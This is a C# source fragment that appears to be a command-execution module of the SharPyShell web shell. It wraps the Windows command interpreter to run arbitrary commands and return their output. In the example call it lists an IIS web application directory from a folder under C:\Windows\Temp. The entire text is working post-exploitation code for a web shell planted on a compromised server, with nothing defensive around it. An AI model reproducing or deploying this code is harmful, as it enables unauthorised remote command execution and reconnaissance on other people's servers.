
                using System;using System.IO;using System.Diagnostics;using System.Text;
                public class SharPyShell
                {                    
                    string ExecCmd(string arg, string working_path)
                    {
                        ProcessStartInfo pinfo = new ProcessStartInfo();
                        pinfo.FileName = Environment.GetEnvironmentVariable("ComSpec");
                        pinfo.Arguments = "/c " + arg;
                        pinfo.RedirectStandardOutput = true;
                        pinfo.RedirectStandardError = true;
                        pinfo.UseShellExecute = false;
                        pinfo.WorkingDirectory = working_path;
                        Process p = new Process();
                        try{
                            p = Process.Start(pinfo);
                        }
                        catch (Exception e){
                            return "{{{SharPyShellError}}}\n" + e;
                        }
                        StreamReader stmrdr_output = p.StandardOutput;
                        StreamReader stmrdr_errors = p.StandardError;
                        string output = "";
                        string stand_out = stmrdr_output.ReadToEnd();
                        string stand_errors = stmrdr_errors.ReadToEnd();
                        stmrdr_output.Close();
                        stmrdr_errors.Close();
                        if (!String.IsNullOrEmpty(stand_out))
                            output = output + stand_out;
                        if (!String.IsNullOrEmpty(stand_errors))
                            output = "{{{SharPyShellError}}}\n" + output + stand_errors;
                        return output;
                    }
                    
                    public byte[] ExecRuntime()
                    {
                        string output_func=ExecCmd(@"dir C:\inetpub\wwwroot\webapp", @"C:\Windows\Temp\infinity_edge");
                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                        return(output_func_byte);
                    }
                }
                